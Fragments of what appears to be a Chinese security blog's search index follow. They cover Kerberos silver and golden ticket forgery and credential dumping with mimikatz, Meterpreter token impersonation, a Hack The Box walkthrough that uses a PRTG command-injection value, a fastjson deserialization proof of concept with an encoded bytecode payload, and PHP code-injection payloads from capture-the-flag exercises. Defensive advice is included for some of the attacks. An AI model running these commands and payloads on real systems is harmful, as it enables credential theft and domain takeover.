","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:4","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"域认证所参与的角色 AD(Account database): 存储所有 client 的白名单，只有存在于白名单的 client 才能顺利申请到TGT Authentication Service: 为 client 生成 TGT 的服务 Ticket Granting Service: 为 client 生成某个服务的 ticket 从物理层面看，AD 与 KDC 均为域控制器(Domain Controller)。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:5","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"域认证粗略流程 client 向 kerberos 服务请求，希望获取访问 server 的权限。 kerberos 得到了这个消息，首先得判断 client 是否是可信赖的，也就是白名单黑名单的说法。这就是 AS 服务完成的工作，通过在 AD 中存储黑名单和白名单来区分 client。成功后，返回 AS 返回 TGT 给 client。 client 得到了 TGT 后，继续向 kerberos 请求，希望获取访问 server 的权限。 kerberos 又得到了这个消息，这时候通过 client 消息中的 TGT，判断出了 client 拥有了这个权限，给了 client 访问 server 的权限 ticket。 client 得到 ticket 后，终于可以成功访问 server。这个 ticket 只是针对这个 server，其他 server 需要向 TGS 申请。 第一步 Session Key 与 Ticket Granting Ticket 第二步 Session Key 与 Ticket Granting Ticket 第三步 Server Session Key 与 Ticket ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:6","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"白银票据 白银票据的特点： 不需要与 KDC 进行交互 需要目标服务的 NTLM Hash 在第三步认证中的 Ticket 的组成： Ticket = Server Hash(Server Session Key + Client info + End Time) 当拥有 Server Hash 时，我们就可以伪造一个不经过 KDC 认证的一个 Ticket。 PS：Server Session Key 在未发送 Ticket 之前，服务器是不知道 Server Session Key 是什么的。 所以，一切凭据都来源于 Server Hash。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:7","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"伪造白银票据 首先需要导出Server Hash： C:\\files\u003emimikatz.exe \"privilege::debug” \"sekurlsa::logonpasswords\" \"exit\" \u003e log.txt 伪造票据: mimikatz “kerberos::golden /domain:\u003c域名\u003e /sid:\u003c域 SID\u003e /target:\u003c目标服务器主机名\u003e /service:\u003c服务类型\u003e /rc4:\u003cNTLM Hash\u003e /user:\u003c用户名\u003e /ptt\" exit Other： kerberos::list #列出票据 kerberos::purge # 清除票据 由于白银票据需要目标服务器的Hash，所以没办法生成对应域内所有服务器的票据，也不能通过TGT申请。因此只能针对服务器上的某些服务去伪造，伪造的服务类型列表如下: 服务注释 服务名 WMI HOST、RPCSS Powershell Remoteing HOST、HTTP WinRM HOST、HTTP Scheduled Tasks HOST LDAP 、DCSync LDAP Windows File Share (CIFS) CIFS Windows Remote ServerAdministration Tools RPCSS、LDAP、CIFS ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:8","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"白银票据(Silver Tickets)防御 尽量保证服务器凭证不被窃取 开启PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由kerberos服务验证票据是否有效。 开启方式: 将注册表中HKEY_LOCAL_MACHINE\\SYSTEM \\ CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters中的ValidateKdcPacSignature设置为1 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:9","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"黄金票据(Golden Tickets) 黄金票据特点: 需要与DC通信 需要krbtgt用户的hash PS:这里的krbtgt hash就是之前讲的KDC Hash 注意:这里的krbtgt hash就是之前讲的KDC Hash ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:10","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"黄金票据(Golden Tickets)-MSF kiwi 使用meterpreter中的kiwi模块： load kiwi ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:11","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"黄金票据(Golden Tickets) - 伪造 伪造票据: mimikatz “kerberos::golden /domain:\u003c域名\u003e /sid:\u003c域SID\u003e /rc4:\u003cKRBTGT NTLM Hash\u003e /user:\u003c任意用户名\u003e /ptt\" exit ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:12","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Tickets 总结 黄金票据:从攻击面来看，获取krbtgt用户的hash后，可以在域中 进行持久性的隐藏，并且日志无法溯源，但是需要拿到DC权限， 使用黄金票据能够在一个域环境中长时间控制整个域。 从防御角度来看，需要经常更新krbtgt的密码，才能够使得原有的 票据失效。最根本的办法是不允许域管账户登录其他服务器。 白银票据:从攻击面来看，伪造白银票据的难度比伪造黄金票据的 难度较小，因为一个域中的服务器如果对外的话，非常容易被入侵， 并且容易被转储Server。 从防御角度来看，需要开启PAC认证，但这会降低认证效率，增加 DC的负担，最根本的还是要加固服务器本身对外的服务。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:13","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Windows Access Token ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:0","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Windows Access Token简介 Windows Token其实叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后，都会生成一个Access Token，这个Token在用户创建进程或者线程 时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。 Access Token种类： 主令牌 模拟令牌 一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的Access Token。 当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:1","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Access Token的组成 用户帐户的安全标识符(SID) 用户所属的组的SID 用于标识当前登录会话的登录SID 用户或用户组所拥有的权限列表 所有者SID 主要组的SID 访问控制列表 访问令牌的来源 令牌是主要令牌还是模拟令牌 限制SID的可选列表 目前的模拟等级 其他统计数据 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:2","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Windows Access Token – SID (Security Identifiers)安全标识符 安全标识符是一个唯一的字符串，它可以代表一个账户、一个用户 组、或者是一次登录。通常它还有一个SID固定列表，例如 Everyone这种已经内置的账户，默认拥有固定的SID。 SID的表现形式: 域SID-用户ID 计算机SID-用户ID SID列表都会存储在域控的AD或者计算机本地账户数据库中。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:3","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Windows Access Token产生过程 每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:4","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Windows Access Token令牌假冒实战 当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。 可以使用多种工具查看目前系统上存在的模拟令牌: Incognito Powershell - Invoke-TokenManipulation.ps1 Cobalt Strike - steal_token 案例(针对某跨国企业的一次渗透测试 获取DC权限）: http://blog.360ec.net/archives/32/ meterpreter \u003e getsystem meterpreter \u003e load incognito meterpreter \u003e list_tokens –u Delegation Tokens Available ============================== NT AUTHORITY\\LOCAL SERVICENT AUTHORITY\\NETWORK SERVICENT AUTHORITY\\SYSTEM PAYLOADS\\Administrator PAYLOADS\\w7 meterpreter \u003e impersonate_token \"PAYLOADS\\\\Administrator” [+] Delegation token available [+] Successfully impersonated user PAYLOADS\\Administrator ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:5","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Windows Access Token令牌假冒防御 禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从控制DC。 如果想清除假冒，重启服务器即可。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:6","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["靶场"],"content":"Hack The Box靶场练习记录","date":"2019-06-10","objectID":"/2019/06/hack-the-boxnetmon/","tags":["HTB靶场"],"title":"Hack The Box —— Netmon","uri":"/2019/06/hack-the-boxnetmon/"},{"categories":["靶场"],"content":"Netmon-Windows https://www.hackthebox.eu/home/machines/profile/177 IP: 10.10.10.152 ","date":"2019-06-10","objectID":"/2019/06/hack-the-boxnetmon/:0:0","tags":["HTB靶场"],"title":"Hack The Box —— Netmon","uri":"/2019/06/hack-the-boxnetmon/"},{"categories":["靶场"],"content":"nmap 扫描 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-10 19:45 CST NSE: Loaded 148 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 19:45 Completed NSE at 19:45, 0.00s elapsed Initiating NSE at 19:45 Completed NSE at 19:45, 0.00s elapsed Initiating Ping Scan at 19:45 Scanning 10.10.10.152 [4 ports] Completed Ping Scan at 19:45, 0.32s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:45 Completed Parallel DNS resolution of 1 host. at 19:45, 0.03s elapsed Initiating SYN Stealth Scan at 19:45 Scanning 10.10.10.152 [1000 ports] Discovered open port 135/tcp on 10.10.10.152 Discovered open port 139/tcp on 10.10.10.152 Discovered open port 445/tcp on 10.10.10.152 Discovered open port 80/tcp on 10.10.10.152 Discovered open port 21/tcp on 10.10.10.152 Increasing send delay for 10.10.10.152 from 0 to 5 due to 23 out of 56 dropped probes since last increase. Completed SYN Stealth Scan at 19:46, 51.60s elapsed (1000 total ports) Initiating Service scan at 19:46 Scanning 5 services on 10.10.10.152 Completed Service scan at 19:46, 11.53s elapsed (5 services on 1 host) Initiating OS detection (try #1) against 10.10.10.152 Retrying OS detection (try #2) against 10.10.10.152 Retrying OS detection (try #3) against 10.10.10.152 Retrying OS detection (try #4) against 10.10.10.152 Retrying OS detection (try #5) against 10.10.10.152 Initiating Traceroute at 19:46 Completed Traceroute at 19:46, 0.36s elapsed Initiating Parallel DNS resolution of 2 hosts. at 19:46 Completed Parallel DNS resolution of 2 hosts. at 19:46, 0.04s elapsed NSE: Script scanning 10.10.10.152. Initiating NSE at 19:46 NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument. Completed NSE at 19:46, 11.52s elapsed Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed Nmap scan report for 10.10.10.152 Host is up (0.30s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM \u003cDIR\u003e inetpub | 07-16-16 09:18AM \u003cDIR\u003e PerfLogs | 02-25-19 10:56PM \u003cDIR\u003e Program Files | 02-03-19 12:28AM \u003cDIR\u003e Program Files (x86) | 02-03-19 08:08AM \u003cDIR\u003e Users |_02-25-19 11:49PM \u003cDIR\u003e Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) |_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479 | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: PRTG/18.1.37.13946 | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm |_http-trane-info: Problem with XML parsing of /evox/about 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 15s, deviation: 0s, median: 15s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-06-10 19:47:00 |_ start_date: 2019-06-10 18:23:19 TRACEROUTE (using port 25/tcp) HOP RTT ADDRESS 1 341.39 ms 10.10.14.1 2 341.99 ms 10.10.10.152 NSE: Script Post-scanning. Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed Read data files from: /usr/local/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.12 seconds Raw packets sent: 1275 (60.374KB) | Rcvd: 1540 (139.830KB) !","date":"2019-06-10","objectID":"/2019/06/hack-the-boxnetmon/:1:0","tags":["HTB靶场"],"title":"Hack The Box —— Netmon","uri":"/2019/06/hack-the-boxnetmon/"},{"categories":["靶场"],"content":"FTP 匿名登录 发现 ftp 可以匿名访问： 在/Users/Public/user.txt 80 端口运行 PRTG Network Monitor 服务 在 c:\\Windows\\ 下发现配置文件 restart.bat net stop PRTGCoreService copy \"c:\\Windows\\PRTG Configuration.dat\" \"C:\\ProgramData\\Paessler\\PRTG Network Monitor\" net start PRTGCoreService 在 C:\\ProgramData\\Paessler\\PRTG Network Monitor 目录中发现备份文件 PRTG Configuration.old.bak。 查找到明文用户名: prtgadmin。密码 PrTg@dmin2018，尝试登陆后失败，PrTg@dmin2019 登陆成功。 ","date":"2019-06-10","objectID":"/2019/06/hack-the-boxnetmon/:2:0","tags":["HTB靶场"],"title":"Hack The Box —— Netmon","uri":"/2019/06/hack-the-boxnetmon/"},{"categories":["靶场"],"content":"已知漏洞搜索 Google 搜索 PRTG 漏洞，发现PRTG \u003c 18.2.39 Command Injection Vulnerability 得到：在Devices 菜单下的 Notifications 下存在命令执行漏洞。 在 Execute Program 下 设置参数为下图所示，并保存设置。 test.txt;tree /f c:\\Users\\Administrator \u003e c:\\output.txt 进入 Devices 界面，发现一个 DNS 服务器处于宕机状态 在此处添加通知，如下图所示： 在 ftp 中发现返回结果 output.txt 尝试导出 Desktop 下的 root.txt，更改 Devices 菜单下的 Notifications 的 Execute Program 参数为： 在 ftp 中查看返回的结果： ","date":"2019-06-10","objectID":"/2019/06/hack-the-boxnetmon/:3:0","tags":["HTB靶场"],"title":"Hack The Box —— Netmon","uri":"/2019/06/hack-the-boxnetmon/"},{"categories":["漏洞复现"],"content":"fastjson 反序列化任意命令执行漏洞","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","tags":["漏洞复现","fastjson"],"title":"fastjson 反序列化任意命令执行漏洞","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"fastjson 反序列化任意命令执行漏洞 ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["漏洞复现","fastjson"],"title":"fastjson 反序列化任意命令执行漏洞","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"漏洞原理 http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/ https://github.com/shengqi158/fastjson-remote-code-execute-poc fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并通过json来填充其属性值。而JDK自带的类com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中有一个私有属性_bytecodes，其部分方法会执行这个值中包含的Java字节码。 所以，想要使用TemplatesImpl的_bytecodes属性执行任意命令，有几个条件： 目标网站使用fastjson库解析json 解析时设置了Feature.SupportNonPublicField，否则不支持传入私有属性 目标使用的jdk中存在TemplatesImpl类 当然不排除有其他不需要TemplatesImpl的利用方法 ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["漏洞复现","fastjson"],"title":"fastjson 反序列化任意命令执行漏洞","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"漏洞复现 本环境目录结构如下： src 本项目源码 main/java java类 IndexFilter.java web源码 Poc.java POC源码 pom.xml 配置文件，使用maven可以直接将本项目编译成war包 exploit.php 读取编译好的POC字节码，并转换成base64 fastjson-1.0.war 打包好的web环境，可以直接放到tomcat下运行 ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["漏洞复现","fastjson"],"title":"fastjson 反序列化任意命令执行漏洞","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"生成字节码 第一步就是编写一个Java类，在这个类中执行命令。然后编译该类，获得.class文件，获得字节码。 修改Poc.java中你想要执行的命令，然后在本目录下使用maven对本项目进行编译，生成target/classes/Poc.class： mvn compile 如果没有安装maven，也可以直接使用fastjson-1.0.war这个压缩包中的WEB-INF/classes/Poc.class。exploit.php中就是读取的这个我已经编译好的class文件。 ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:1","tags":["漏洞复现","fastjson"],"title":"fastjson 反序列化任意命令执行漏洞","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"构造POC 生成.class文件后，将该文件的内容进行base64编码，放在json中_bytecodes的值的位置，如下： {\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMUG9jOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAgACQcALwwAMAAxAQAhb3BlbiAvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwDAAyADMBAANQb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACwAEAAwADQANAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAFgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAZAAgAGgAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"} 如果想使用已经编译好的.class文件，可以直接执行php exploit.php获得POC： 使用jdk1.8编译，执行的命令是touch /tmp/success，所以在Windows下会执行失败。Windows用户请自己修改Poc.java，生成自己的POC。 ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:2","tags":["漏洞复现","fastjson"],"title":"fastjson 反序列化任意命令执行漏洞","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"漏洞利用 目标是一个web应用，访问返回“Hello world”。正常POST一个json，目标会提取json对象中的name和age拼接成一句话返回： 发送步骤二中获取的POC，成功执行命令： 如上图，/tmp/success文件成功被创建。 ","date":"2019-06-09","objectID":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:3","tags":["漏洞复现","fastjson"],"title":"fastjson 反序列化任意命令执行漏洞","uri":"/2019/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","CTF"],"content":"CTF 中的命令执行漏洞相关","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","tags":["常用","渗透测试","代码审计"],"title":"CTF 中的命令执行漏洞","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","CTF"],"content":"CTF 中的命令执行漏洞相关 由于没有针对代码中可执行的特殊函数入口做过滤，导致用户可以提交恶意语句，并交由服务器端执行。 代码 / 命令注入攻击中 Web 服务器没有过滤类似 system()、eval()、exec() 等函数的传入参数是该漏洞攻击成功的最主要原因。 ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["常用","渗透测试","代码审计"],"title":"CTF 中的命令执行漏洞","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","CTF"],"content":"1 代码注入 ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["常用","渗透测试","代码审计"],"title":"CTF 中的命令执行漏洞","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","CTF"],"content":"1.1 相关函数 1.1.1 eval \u003c?php hilight_file(__FILE__); $a = 'phpinfo();'; eval($a); ?\u003e 1.1.2 assert 1.1.3 call_user_func 可以使用 is_callable 函数查看是否可以被回调 1.1.4 call_user_func_array 1.1.5 create_function 1.1.6 preg_replace 搜索 subject 中匹配 pattern 的部分， 以 replacement 或其执行结果进行替换。 1.1.7 array_map payload：url?a=assert\u0026b=phpinfo() 1.1.8 usort Payload：url?1[]=phpinfo()\u00261[]=123\u00262=assert 1.1.9 uasort 1.1.10 ${php 代码} 